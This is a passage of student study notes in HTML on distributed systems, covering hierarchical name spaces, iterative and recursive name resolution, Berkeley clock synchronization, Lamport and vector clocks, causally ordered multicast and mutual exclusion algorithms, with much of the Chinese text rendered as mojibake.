<p>è¿™æ˜¯ä¸­æ–‡æ•™æçš„é…å›¾ï¼Œæ€ä¹ˆéƒ½çœ‹ä¸æ‡‚è¿™ä¸¤æ¡çº¿å•¥æ„æ€ï¼ŒåŸæ¥ä¸­æ–‡æ•™æç”¨æˆæŸ¥è¯¢çš„å›¾äº†ã€‚</p>
<h3 id="HLSæ€æƒ³"><a href="#HLSæ€æƒ³" class="headerlink" title="HLSæ€æƒ³"></a>HLSæ€æƒ³</h3><p>è‹¥ç”¨root nodeå®ç°æ‰å¹³åŒ–ç›´æ¥ç®¡ç†ï¼Œæ ¹èŠ‚ç‚¹è´Ÿè½½è¿‡å¤§ï¼Œä¸”ä¸€æ—¦å´©æºƒï¼Œæ•´ä¸ªé›†ç¾¤ç³»ç»Ÿç˜«ç—ªã€‚å› æ­¤ï¼Œä½¿ç”¨åˆ†æ²»æ€æƒ³ï¼Œä¸åŒdomå†…å®ç°è‡ªæ²»ã€‚</p>
<h2 id="åç§°ç©ºé—´çš„å®ç°-Name-Space-Implementation"><a href="#åç§°ç©ºé—´çš„å®ç°-Name-Space-Implementation" class="headerlink" title="åç§°ç©ºé—´çš„å®ç° - Name Space Implementation"></a>åç§°ç©ºé—´çš„å®ç° - Name Space Implementation</h2><blockquote>
<p>Basic issue</p>
<p>Distribute the name resolution process as well as name space management across multiple machines, by distributing nodes of the naming graph.</p>
</blockquote>
<h3 id="Consider-a-hierarchical-naming-graph-and-distinguish-three-levels"><a href="#Consider-a-hierarchical-naming-graph-and-distinguish-three-levels" class="headerlink" title="Consider a hierarchical naming graph and distinguish three levels:"></a>Consider a hierarchical naming graph and distinguish three levels:</h3><ul>
<li><strong>Global level:</strong><br>Consists of the high-level directory nodes. Main aspect is that these directory nodes have to be jointly managed by different administrations</li>
<li><strong>Administrational level:</strong><br>Contains mid-level directory nodes that can be grouped in such a way that each group can be assigned to a separate administration.</li>
<li><strong>Managerial level:</strong><br>Consists of low-level directory nodes within a single administration. Main issue is effectively mapping directory nodes to local name servers.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451780.png" alt="Globalimage-20190417153950223"></p>
<p>ä»ä¸Šè‡³ä¸‹ä¾æ¬¡åˆ†ä¸ºäº†Global level, Administrational level and Managerial levelã€‚</p>
<p>Globalå±‚å‡ ä¹ä¸æ€ä¹ˆå˜åŒ–ï¼ŒAdministrationalå±‚å˜åŒ–å¤šäº›ï¼ŒManagerialå±‚å˜åŒ–æœ€å¤šã€‚</p>
<p>å…·ä½“åŒºåˆ«çœ‹ä¸‹é¢è¿™ä¸ªè¡¨ï¼š</p>
<table>
<thead>
<tr>
<th align="left">Item</th>
<th align="left">Global</th>
<th align="left">Administrational</th>
<th align="left">Managerial</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Geographical scale of network</td>
<td align="left">Worldwide</td>
<td align="left">Organization</td>
<td align="left">Department</td>
</tr>
<tr>
<td align="left">Total number of nodes</td>
<td align="left">Few</td>
<td align="left">Many</td>
<td align="left">Vast numbers</td>
</tr>
<tr>
<td align="left">Responsiveness to lookups</td>
<td align="left">Seconds</td>
<td align="left">Milliseconds</td>
<td align="left">Immediate</td>
</tr>
<tr>
<td align="left">Update propagation</td>
<td align="left">Lazy</td>
<td align="left">Immediate</td>
<td align="left">Immediate</td>
</tr>
<tr>
<td align="left">Number of replicas</td>
<td align="left">Many</td>
<td align="left">None or few</td>
<td align="left">None</td>
</tr>
<tr>
<td align="left">Is client-side caching applied?</td>
<td align="left">Yes</td>
<td align="left">Yes</td>
<td align="left">Sometimes</td>
</tr>
</tbody></table>
<h2 id="åç§°è§£æ-Name-Resolution"><a href="#åç§°è§£æ-Name-Resolution" class="headerlink" title="åç§°è§£æ - Name Resolution"></a>åç§°è§£æ - Name Resolution</h2><h3 id="è¿­ä»£åç§°è§£æ-Iterative-Name-Resolution"><a href="#è¿­ä»£åç§°è§£æ-Iterative-Name-Resolution" class="headerlink" title="è¿­ä»£åç§°è§£æ - Iterative Name Resolution"></a>è¿­ä»£åç§°è§£æ - Iterative Name Resolution</h3><ul>
<li>resolve(dir,[name1,â€¦,nameK]) is sent to Server0 responsible for dir</li>
<li>Server0 resolves resolve(dir,name1) â†’ dir1, returning the identification (address) of Server1, which stores dir1.</li>
<li>Client sends resolve(dir1,[name2,â€¦,nameK]) to Server1, etc.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451781.png" alt="image-20190417162116644"></p>
<h3 id="é€’å½’åç§°è§£æ-Recursive-Name-Resolution"><a href="#é€’å½’åç§°è§£æ-Recursive-Name-Resolution" class="headerlink" title="é€’å½’åç§°è§£æ - Recursive Name Resolution"></a>é€’å½’åç§°è§£æ - Recursive Name Resolution</h3><ul>
<li>resolve(dir,[name1,â€¦,nameK]) is sent to Server0 responsible for dir</li>
<li>Server0 resolves resolve(dir,name1) â†’dir1, and sends resolve(dir1,[name2,â€¦,nameK]) to Server1, which stores dir1.</li>
<li>Server0 waits for the result from Server1, and returns it to the client.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451782.png" alt="image-20190417162203036"></p>
<h3 id="Scalability-Issues"><a href="#Scalability-Issues" class="headerlink" title="Scalability Issues"></a>Scalability Issues</h3><p><em><strong>Issue 1</strong></em></p>
<p>å› ä¸ºåç§°è§£æéƒ½éœ€è¦å…ˆè§£æé«˜çº§åŸŸåï¼Œæ‰€ä»¥é«˜å±‚æœåŠ¡å™¨çš„éœ€è¦æ¯ç§’å¤„ç†å¤§é‡å¤„ç†è¯·æ±‚ã€‚</p>
<p><em><strong>Solution:</strong></em></p>
<p>å› ä¸ºåœ¨globalå±‚å’Œadministrationalå±‚çš„ç»“ç‚¹å†…å®¹å‡ ä¹ä¸ä¼šå˜ï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›æœåŠ¡å™¨çš„å†…å®¹å¹¿æ³›åœ°å¤åˆ¶åˆ°å¤šä¸ªæœåŠ¡å™¨ä¸­ï¼Œè¿™æ ·åç§°è§£æå¯ä»¥å°±è¿‘å¤„ç†ï¼ŒåŠ å¿«é€Ÿåº¦ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†å‘è¯·æ±‚åˆ°é«˜å±‚æœåŠ¡å™¨ã€‚</p>
<p><em><strong>Issue 2</strong></em></p>
<p><em><strong>Geographical scalability</strong></em> - åœ°åŸŸå¯æ‰©å±•æ€§ï¼Œå³åç§°è§£ææœåŠ¡è¦å¯ä»¥åœ¨å¾ˆå¤§çš„åœ°ç†è·ç¦»å†…è¿›è¡Œæ‰©å±•ã€‚</p>
<p>å¦‚æœå®¢æˆ·å’ŒæœåŠ¡å™¨ç«¯ç¦»çš„æ¯”è¾ƒè¿œï¼Œé‚£ä¹ˆæœ€å¥½é‡‡ç”¨é€’å½’åç§°è§£æï¼Œå› ä¸ºå®¢æˆ·ç«¯åªå’ŒæœåŠ¡å™¨é€šä¿¡ä¸€æ¬¡å³å¯å–å¾—ç»“æœï¼Œè€Œè¿­ä»£åç§°è§£æéœ€è¦é€šä¿¡å¤šæ¬¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451783.png" alt="image-20190417163715938"></p>
<hr>
<h1 id="Chapter-6-åŒæ­¥åŒ–-Synchronization"><a href="#Chapter-6-åŒæ­¥åŒ–-Synchronization" class="headerlink" title="Chapter 6 åŒæ­¥åŒ– - Synchronization"></a>Chapter 6 åŒæ­¥åŒ– - Synchronization</h1><h2 id="æ—¶é’ŸåŒæ­¥-Clock-Synchronization"><a href="#æ—¶é’ŸåŒæ­¥-Clock-Synchronization" class="headerlink" title="æ—¶é’ŸåŒæ­¥ - Clock Synchronization"></a>æ—¶é’ŸåŒæ­¥ - Clock Synchronization</h2><h3 id="Berkeleyç®—æ³•"><a href="#Berkeleyç®—æ³•" class="headerlink" title="Berkeleyç®—æ³•"></a>Berkeleyç®—æ³•</h3><p>Berkeley UNIXç³»ç»Ÿçš„æ—¶é—´æœåŠ¡å™¨(å®é™…ä¸Šæ˜¯æ—¶é—´å®ˆæŠ¤ç¨‹åº)æ˜¯ä¸»åŠ¨çš„ï¼Œå®šæœŸè¯¢é—®æ¯å°æœºå™¨çš„æ—¶é—´ã€‚ç„¶åç®—å‡ºä¸€ä¸ªå¹³å‡æ—¶é—´ï¼Œå¹¶å‘Šè¯‰æ‰€æœ‰å…¶ä»–æœºå™¨å°†å®ƒä»¬çš„æ—¶é’Ÿæ‹¨å¿«&#x2F;æ‹¨æ…¢ä¸€ä¸ªæ–°çš„æ—¶é—´ã€‚</p>
<p>Berkeleyç®—æ³•é™¤äº†ç¬¬ä¸€æ¬¡ä¼ æ’­æ—¶é—´å®ˆæŠ¤ç¨‹åºçš„å¹¿æ’­å¤–ï¼Œä¼ æ’­çš„éƒ½æ˜¯<strong>ç›¸å¯¹æ—¶é—´</strong>ï¼Œå¦‚ä¸‹å›¾çš„bå’Œcï¼Œç›®çš„æ˜¯ä¸ºäº†<strong>å‡å°è¯¯å·®</strong>ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451784.png" alt="image-20190420021051196"></p>
<p><strong>æ„Ÿè°¢ç‹æµ·æ°åŒå­¦å‘ç°å¹¶æé†’æˆ‘ä¸­æ–‡ä¹¦è¿™é‡Œæ—¶é—´å†™é”™äº†ã€‚</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451785.png" alt="image-20190417195809532"></p>
<h2 id="é€»è¾‘æ—¶é’Ÿ-Logical-clocks"><a href="#é€»è¾‘æ—¶é’Ÿ-Logical-clocks" class="headerlink" title="é€»è¾‘æ—¶é’Ÿ - Logical clocks"></a>é€»è¾‘æ—¶é’Ÿ - Logical clocks</h2><h3 id="Lamporté€»è¾‘æ—¶é’Ÿ"><a href="#Lamporté€»è¾‘æ—¶é’Ÿ" class="headerlink" title="Lamporté€»è¾‘æ—¶é’Ÿ"></a>Lamporté€»è¾‘æ—¶é’Ÿ</h3><h4 id="å…ˆå‘ç”Ÿå…³ç³»-Happen-Before-HB-Relation"><a href="#å…ˆå‘ç”Ÿå…³ç³»-Happen-Before-HB-Relation" class="headerlink" title="å…ˆå‘ç”Ÿå…³ç³» - Happen-Before (HB) Relation"></a>å…ˆå‘ç”Ÿå…³ç³» - Happen-Before (HB) Relation</h4><p>è¡¨è¾¾å¼ï¼šaâ†’bè¯»ä½œâ€aåœ¨bä¹‹å‰å‘ç”Ÿâ€ï¼Œæ„æ€æ˜¯æ‰€æœ‰è¿›ç¨‹ä¸€ç›´è®¤ä¸ºäº‹ä»¶aå…ˆå‘ç”Ÿï¼Œç„¶åäº‹ä»¶bæ‰å‘ç”Ÿã€‚</p>
<p>HBå…³ç³»å‡†åˆ™ï¼š</p>
<ol>
<li><p>$If \exist processp_i : a \ comes \ before \ b,then\ a\rightarrow b$</p>
<p>å¦‚æœaå’Œbæ˜¯åŒä¸€è¿›ç¨‹ä¸­çš„ä¸¤ä¸ªäº‹ä»¶ï¼Œä¸”aåœ¨bä¹‹å‰å‘ç”Ÿï¼Œåˆ™a<em>â†’</em>bä¸ºçœŸ</p>
</li>
<li><p>For any message m, <em><strong>send(m)* â†’ *receive(m)</strong></em></p>
<p>å¦‚æœaæ˜¯ä¸€ä¸ªè¿›ç¨‹ä¸­<strong>å‘é€</strong>æ¶ˆæ¯çš„äº‹ä»¶ï¼Œbæ˜¯å¦ä¸€ä¸ªè¿›ç¨‹ä¸­<strong>æ¥å—</strong>è¿™ä¸ªæ¶ˆæ¯çš„äº‹ä»¶ï¼Œé‚£ä¹ˆa<em>â†’</em>bä¸ºçœŸ</p>
</li>
<li><p>IF a, b and c are events such that, <em><strong>a* â†’ <em>b</em> and <em>b</em> â†’ <em>c</em>, then <em>a</em> â†’ *c</strong></em></p>
<p>å¦‚æœaâ†’bï¼Œbâ†’cï¼Œé‚£ä¹ˆaâ†’c</p>
</li>
</ol>
<p><em><strong>Problem</strong></em>ï¼š</p>
<p>How do we maintain a global view on the systemâ€™s behavior that is consistent with the happened before relation?</p>
<p>å¦‚ä½•ä½¿ç”¨HB Relationæ¥ç»´æŒç³»ç»Ÿæ—¶é—´ä¸€è‡´ï¼Ÿ</p>
<p><em><strong>Solution:</strong></em><br>attach a timestamp ğ¶(ğ‘’) to each event e, satisfying the following properties:</p>
<p>å¯¹äºæ¯ä¸ªäº‹ä»¶aï¼Œæˆ‘ä»¬éƒ½èƒ½ä¸ºå®ƒåˆ†é…ä¸€ä¸ªæ‰€æœ‰è¿›ç¨‹éƒ½è®¤å¯çš„æ—¶é—´å€¼ğ¶(ğ‘)</p>
<ol>
<li><p>If a and b are two events in the same process, and aâ†’b, then we demand that ğ¶(ğ‘)&lt;ğ¶(ğ‘).</p>
<p>å¦‚æœaæ¯”bå…ˆï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯ğ¶(ğ‘)&lt;ğ¶(ğ‘).</p>
</li>
<li><p>If a corresponds to sending a message m, and b to the receipt of that message, then also C(a) &lt; C(b).</p>
<p>è‹¥aæ˜¯å‘é€çš„ï¼Œbæ˜¯æ¥å—çš„ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯ğ¶(ğ‘)&lt;ğ¶(ğ‘).</p>
</li>
</ol>
<p>è‹¥ä¸Šè¿°ä¸¤æ¡æœ€åå‡ºç°äº†ğ¶(ğ‘)â‰¥ğ¶(ğ‘)ï¼Œé‚£ä¹ˆæ‰§è¡Œæ“ä½œğ¶(ğ‘)&#x3D;ğ¶(ğ‘)+1ï¼Œä½¿å¾—ğ¶(ğ‘)&lt;ğ¶(ğ‘).</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451786.png" alt="image-20190417211008993"></p>
<p>m3æ˜¯ä»P3å‘é€ç»™P2ï¼Œå‘é€æ—¶é—´æ˜¯P3çš„60ï¼Œæ¥å—æ—¶é—´æ˜¯P2çš„56ï¼Œè¿™ä¸ç¬¦åˆå‘é€æ—¶é—´&lt;æ¥æ”¶æ—¶é—´ï¼Œæ‰€ä»¥æŠŠæ¥å—æ—¶é—´æ”¹ä¸ºå‘é€æ—¶é—´+1ï¼Œå³61ã€‚m4åŒç†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451787.png" alt="image-20190417211446492"></p>
<p><strong>æ³¨æ„ï¼šè°ƒæ•´æ—¶é’Ÿæ“ä½œå‘ç”Ÿåœ¨ä¸­é—´ä»¶å±‚ã€‚</strong></p>
<h3 id="å…¨åºå¤šæ’­"><a href="#å…¨åºå¤šæ’­" class="headerlink" title="å…¨åºå¤šæ’­"></a>å…¨åºå¤šæ’­</h3><p><strong>æ‰€è°“çš„å…¨åºï¼Œå°±æ˜¯æ‰€æœ‰è¿›ç¨‹ç»Ÿä¸€é¡ºåº</strong>ï¼Œåªè¦æœ€åæ‰€æœ‰è¿›ç¨‹çš„äº‹ä»¶æ‰§è¡Œé¡ºåºç›¸åŒå°±è¡Œã€‚</p>
<ol>
<li>è¿›ç¨‹å…ˆç»™æ¶ˆæ¯æ‰“ä¸Šä¸€ä¸ªå½“å‰é€»è¾‘æ—¶é—´ä½œä¸ºæ—¶é—´æˆ³ï¼Œç„¶åæŠŠè¿™ä¸ªæ¶ˆæ¯æ”¾è¿›è‡ªå·±çš„æœ¬åœ°é˜Ÿåˆ—ä¸­ï¼Œå†å°†è¿™ä¸ªæ¶ˆæ¯å‘é€ç»™å…¶ä»–è¿›ç¨‹ï¼›</li>
<li>è¿›ç¨‹æ”¶åˆ°æ¥è‡ªå…¶ä»–è¿›ç¨‹çš„æ¶ˆæ¯åï¼Œä¹ŸæŠŠè¿™ä¸ªæ¶ˆæ¯æ”¾è¿›æœ¬åœ°é˜Ÿåˆ—ä¸­ï¼ŒæŒ‰æ—¶é—´æˆ³æ’åºã€‚</li>
</ol>
<p>ä¾‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451788.jpg" alt="IMG_20190417_214308"></p>
<p>Aå’ŒBçš„æ—¶é—´ä¸åŒï¼ŒAåœ¨æœ¬åœ°æ—¶é—´3å‘å‡ºæ¶ˆæ¯ï¼ŒBåœ¨æœ¬åœ°æ—¶é—´6å‘å‡ºæ¶ˆæ¯ã€‚</p>
<p>æœ€ååŒæ–¹çš„æœ¬åœ°é˜Ÿåˆ—çš„é¡ºåºéƒ½æ˜¯å…ˆæ‰§è¡ŒAçš„æ¶ˆæ¯ï¼Œå†æ‰§è¡ŒBçš„æ¶ˆæ¯ã€‚</p>
<p>ä½†æ˜¯è¿™æ ·æ°¸è¿œæ˜¯æ—¶é—´å¿«çš„è¿›ç¨‹å…ˆæ‰§è¡Œï¼Œæ—¶é—´æ…¢çš„åæ‰§è¡Œï¼Œæ‰€ä»¥Bå‘é€ç»™Açš„æ—¶å€™ï¼Œè¦ä½¿ç”¨Lamporté€»è¾‘æ—¶é’Ÿå‡†åˆ™è°ƒæ•´Açš„æ—¶é’Ÿã€‚</p>
<p><strong>å…¨åºå¤šæ’­å¼€é”€å¾ˆå¤§ï¼</strong></p>
<p>å­—ä¸‘å‹¿è§æ€ª</p>
<h3 id="å‘é‡æ—¶é’Ÿ"><a href="#å‘é‡æ—¶é’Ÿ" class="headerlink" title="å‘é‡æ—¶é’Ÿ"></a>å‘é‡æ—¶é’Ÿ</h3><p>ä½†æ˜¯å‘é‡æ—¶é’Ÿå¯ä»¥æ•è·<strong>å› æœå…³ç³»</strong>ã€‚</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½ç»´æŠ¤ä¸€ä¸ªå‘é‡ğ‘‰ğ¶ï¼Œæ¯”å¦‚è¿›ç¨‹ğ‘ƒğ‘–ç»´æŠ¤çš„å‘é‡å°±æ˜¯ğ‘‰ğ¶ğ‘–ï¼Œæœ‰ä¸¤ä¸ªæ€§è´¨ï¼š</p>
<ol>
<li>ğ‘‰ğ¶ğ‘–[ğ‘–]è¡¨ç¤ºç›®å‰ä¸ºæ­¢ï¼Œæœ¬è¿›ç¨‹ğ‘ƒğ‘–å‘ç”Ÿäº†å¤šå°‘äº‹ä»¶ï¼›</li>
<li>ğ‘‰ğ¶ğ‘–[ğ‘—]&#x3D;ğ‘˜è¡¨ç¤ºè¿›ç¨‹ğ‘ƒğ‘–çŸ¥é“ğ‘ƒğ‘—å·²ç»å‘ç”Ÿäº†kä¸ªäº‹ä»¶ã€‚</li>
</ol>
<p>æ‰§è¡Œæ­¥éª¤ï¼š</p>
<ol>
<li>ğ‘ƒğ‘–è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªäº‹ä»¶ä¹‹å‰ï¼Œå…ˆæŠŠè‡ªèº«çš„å‘é‡é‡Œç¬¬iä¸ªåˆ†é‡(ä¹Ÿå°±æ˜¯ğ‘‰ğ¶ğ‘–[ğ‘–])è‡ªå¢1ï¼›</li>
<li>ğ‘ƒğ‘–è¿›ç¨‹å‘é€ä¸€ä¸ªæ¶ˆæ¯mç»™ğ‘ƒğ‘—æ—¶ï¼ŒæŠŠmçš„æ—¶é—´æˆ³ts(m)è®¾ç½®ä¸ºç­‰äºğ‘‰ğ¶ğ‘–ï¼›</li>
<li>æ¥å—æ¶ˆæ¯mæ—¶ï¼Œè¿›ç¨‹ğ‘ƒğ‘—é€šè¿‡ä¸ºæ¯ä¸ªkè®¾ç½®ğ‘‰ğ¶ğ‘—[ğ‘˜]&#x3D;max(ğ‘‰ğ¶ğ‘—[ğ‘˜],ğ‘¡ğ‘ (ğ‘š)[ğ‘˜])æ¥è°ƒæ•´è‡ªå·±çš„å‘é‡ã€‚ç„¶åï¼Œğ‘ƒğ‘—è¦æ‰§è¡Œè¿™ä¸ªäº‹ä»¶ï¼Œå¦‚æ­¥éª¤1æ‰€ç¤ºï¼ŒæŠŠğ‘‰ğ¶ğ‘—[ğ‘–]è‡ªå¢1.</li>
</ol>
<h4 id="å¼ºåˆ¶å› æœåºå¤šæ’­"><a href="#å¼ºåˆ¶å› æœåºå¤šæ’­" class="headerlink" title="å¼ºåˆ¶å› æœåºå¤šæ’­"></a>å¼ºåˆ¶å› æœåºå¤šæ’­</h4><p><strong>è®¾è®¡æ€æƒ³ï¼š</strong></p>
<p>æˆ‘æ‡‚çš„ä¸èƒ½æ¯”ä½ å°‘ï¼Œä¸ç„¶ä¸‡ä¸€æœ‰å…¶ä»–æ¶ˆæ¯è¿˜æ²¡æ¥ï¼Œä½ çš„æ¶ˆæ¯å°±æ’é˜Ÿäº†ï¼Œæ‰€ä»¥æˆ‘ä¸èƒ½æ”¶ä½ çš„æ¶ˆæ¯ã€‚</p>
<p><strong>å…·ä½“æ“ä½œï¼š</strong></p>
<p>è¿›ç¨‹ğ‘ƒğ‘–å‘ç»™è¿›ç¨‹ğ‘ƒğ‘—ä¸€ä¸ªæ—¶é—´æˆ³ä¸ºğ‘¡ğ‘ (ğ‘š)çš„æ¶ˆæ¯mã€‚å¦‚æœä¸æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼Œè¿™ä¸ªæ¶ˆæ¯å°±ä¸äº¤ä»˜ç»™åº”ç”¨å±‚ï¼Œç›´åˆ°æ»¡è¶³æ¡ä»¶ä¸ºæ­¢ï¼š</p>
<ol>
<li>ğ‘¡ğ‘ (ğ‘š)[ğ‘–]&#x3D;ğ‘‰ğ¶ğ‘—[ğ‘–]+1</li>
<li>ğ‘¡ğ‘ (ğ‘š)[ğ‘˜]â‰¤ğ‘‰ğ¶ğ‘—[ğ‘˜]  ğ‘“ğ‘œğ‘Ÿğ‘ğ‘™ğ‘™ğ‘˜â‰ ğ‘–</li>
</ol>
<p>å…³äºä½ åˆšåˆšå‘çš„æ¶ˆæ¯ï¼Œå¯ä»¥æ¯”æˆ‘å¤šçŸ¥é“ä¸€æ¡æ¶ˆæ¯ã€‚æ¯•ç«Ÿä»–å‘çš„ï¼Œè‚¯å®šæ¯”æˆ‘å¤šäº†è§£ä¸€æ¡ï¼›</p>
<p>ä½†æ˜¯å…³äºå…¶ä»–æ¶ˆæ¯ï¼Œä½ çŸ¥é“çš„ä¸å¯ä»¥æ¯”æˆ‘å¤šï¼Œä¸ç„¶æˆ‘å°±æ˜¯è¿˜æœ‰å…¶ä»–æ¶ˆæ¯æ²¡æ”¶åˆ°ï¼Œç­‰æˆ‘æ”¶åˆ°å…¶ä»–æ¶ˆæ¯åå†å¤„ç†è¿™ä¸ªæ¶ˆæ¯ã€‚</p>
<p><strong>è¿™æœ¬ä¸­æ–‡ä¹¦ä½ è¿˜èƒ½å†å‘ä¸€ç‚¹å—ï¼Ÿ</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451789.png" alt="image-20190418102502861"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451790.png" alt="image-20190418104322665"></p>
<p><strong>ä¾‹ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451791.png" alt="image-20190418104501554"></p>
<ol>
<li>ğ‘ƒ0å…ˆå‘é€æ¶ˆæ¯mï¼Œè‡ªèº«å…ˆæŠŠğ‘‰ğ¶0[0]è‡ªå¢1ï¼Œæ¶ˆæ¯çš„æ—¶é—´æˆ³ä¸º(1, 0, 0)ï¼›</li>
<li>ğ‘ƒ1æ”¶åˆ°æ¶ˆæ¯mï¼Œå½“æ—¶ğ‘ƒ1çš„å‘é‡æ˜¯(0, 0, 0)ï¼Œåªæœ‰ç¬¬ä¸€ç»´æ¯”è‡ªå·±å¤š1ä¸ªï¼Œå…¶ä»–éƒ½å’Œè‡ªå·±ç›¸åŒï¼Œæ‰€ä»¥æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œæ¶ˆæ¯äº¤ä»˜åº”ç”¨å±‚ï¼›</li>
<li>ğ‘ƒ1å‘é€æ¶ˆæ¯m*ï¼Œè‡ªèº«å…ˆæŠŠğ‘‰ğ¶1[1]è‡ªå¢1ï¼Œæ¶ˆæ¯çš„æ—¶é—´æˆ³ä¸º(1, 1, 0)ï¼Œ ğ‘ƒ0æ¥æ”¶æ­¤æ¶ˆæ¯ï¼›</li>
<li>ğ‘ƒ2ä¸æ¥æ”¶ğ‘ƒ1å‘é€çš„æ¶ˆæ¯ï¼Œå› ä¸ºæ­¤æ—¶ğ‘ƒ2çš„å‘é‡æ˜¯(0, 0, 0)ï¼Œğ‘ƒ0çš„æ¶ˆæ¯è¿˜æ²¡æ”¶åˆ°ï¼Œæ‰€ä»¥å»¶è¿Ÿæ¥å—ğ‘ƒ1çš„æ¶ˆæ¯ï¼›</li>
<li>ç­‰åˆ°ğ‘ƒ0çš„æ¶ˆæ¯åˆ°æ¥ï¼Œğ‘ƒ2è°ƒæ•´è¿‡è‡ªèº«çš„å‘é‡åï¼Œæ‰å¯ä»¥æ¥æ”¶ğ‘ƒ1çš„æ¶ˆæ¯ã€‚</li>
</ol>
<p>ä¾‹2ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451792.png" alt="image-20190418105824022"></p>
<h2 id="äº’æ–¥-Mutual-Exclusion"><a href="#äº’æ–¥-Mutual-Exclusion" class="headerlink" title="äº’æ–¥ - Mutual Exclusion"></a>äº’æ–¥ - Mutual Exclusion</h2><p>åˆ†å¸ƒå¼ç³»ç»Ÿæƒ…å†µä¸‹ï¼Œè¿›ç¨‹å°†éœ€è¦åŒæ—¶è®¿é—®ç›¸åŒçš„èµ„æºï¼Œäº’æ–¥ç®—æ³•å°±æ˜¯ä¿è¯è¿›ç¨‹ä¹‹é—´èƒ½å¤Ÿäº’æ–¥è®¿é—®èµ„æºã€‚</p>
<h3 id="é›†ä¸­å¼ç®—æ³•"><a href="#é›†ä¸­å¼ç®—æ³•" class="headerlink" title="é›†ä¸­å¼ç®—æ³•"></a>é›†ä¸­å¼ç®—æ³•</h3><p>é€‰ä¸¾ä¸€ä¸ªè¿›ç¨‹ä½œä¸ºåè°ƒè€…ã€‚å…¶ä»–è¿›ç¨‹æƒ³è®¿é—®èµ„æºéƒ½è¦é—®ä»–ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451793.png" alt="image-20190418203632964"></p>
<p>è¿›ç¨‹3æ˜¯åè°ƒè€…ï¼Œè¿›ç¨‹1æƒ³è®¿é—®èµ„æºï¼Œé—®ä¸€ä¸‹è¿›ç¨‹3ï¼Œè¿›ç¨‹3è¯´okã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451794.png" alt="image-20190418203738517"></p>
<p>è¿›ç¨‹2ä¹Ÿæƒ³è®¿é—®èµ„æºï¼Œè¿›ç¨‹3ä¸ç†è¿›ç¨‹2ï¼Œä½†æ˜¯æŠŠè¿›ç¨‹2æ”¾åˆ°ç­‰å¾…é˜Ÿåˆ—é‡Œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451795.png" alt="image-20190418204013915"></p>
<p>è¿›ç¨‹1ç”¨å®Œèµ„æºåï¼Œå‘è¿›ç¨‹3è¯´ä¸€å£°ä»–ç”¨å®Œäº†ã€‚è¿›ç¨‹3ä¾¿å‘ç­‰å¾…é˜Ÿåˆ—çš„é˜Ÿé¦–è¿›ç¨‹è¯´ä¸€å£°ï¼Œå¯ä»¥ç”¨èµ„æºäº†ã€‚</p>
<h3 id="éé›†ä¸­å¼ç®—æ³•"><a href="#éé›†ä¸­å¼ç®—æ³•" class="headerlink" title="éé›†ä¸­å¼ç®—æ³•"></a>éé›†ä¸­å¼ç®—æ³•</h3><blockquote>
<p>è¿™ä¸ªDecentralizedä¸€ç‚¹æ„ä¹‰éƒ½æ²¡æœ‰ï¼å¼€é”€å¤§ï¼ç¥ç»ç—…ï¼ä¹¦ä¸Šä¸¾è¿™ä¸ªä¾‹å­å°±æ˜¯è¯´ä¸è¦ä»€ä¹ˆäº‹éƒ½å°è¯•Decentralizedã€‚Googleäº‘è®¡ç®—çš„ä¹Ÿåªæ˜¯ä¸€ä¸ªåè°ƒè€…ï¼Œåè°ƒè€…æŒ‚äº†å°±é€‰ä¸¾ã€‚å¤šåè°ƒè€…æ²¡å¥½å¤„ï¼Œåªä¼šæ‰¯çš®ï¼</p>
<p>â€”â€”ä¸ç®</p>
</blockquote>
<h3 id="åˆ†å¸ƒå¼ç®—æ³•"><a href="#åˆ†å¸ƒå¼ç®—æ³•" class="headerlink" title="åˆ†å¸ƒå¼ç®—æ³•"></a>åˆ†å¸ƒå¼ç®—æ³•</h3><p>å½“ä¸€ä¸ªè¿›ç¨‹æƒ³è¦æŸä¸ªèµ„æºï¼Œå°±å‘æ‰€æœ‰å…¶ä»–è¿›ç¨‹å‘é€æ¶ˆæ¯è¯¢é—®ã€‚æ¯”å¦‚è¿›ç¨‹Aæƒ³è¦ä¸€ä¸ªèµ„æºï¼Œå°±å‘å…¶ä»–è¿›ç¨‹å‘æ¶ˆæ¯è¯¢é—®ï¼Œè¿›ç¨‹Bå°±æ”¶åˆ°äº†Açš„æ¶ˆæ¯ã€‚</p>
<ul>
<li><p>è‹¥Bä¸æƒ³ç”¨è¿™ä¸ªèµ„æºï¼Œå°±ç»™Aå›ä¸€ä¸ªOKã€‚</p>
<p>â€œYes, you can have it. I donâ€™t want it, so what do I care?â€</p>
</li>
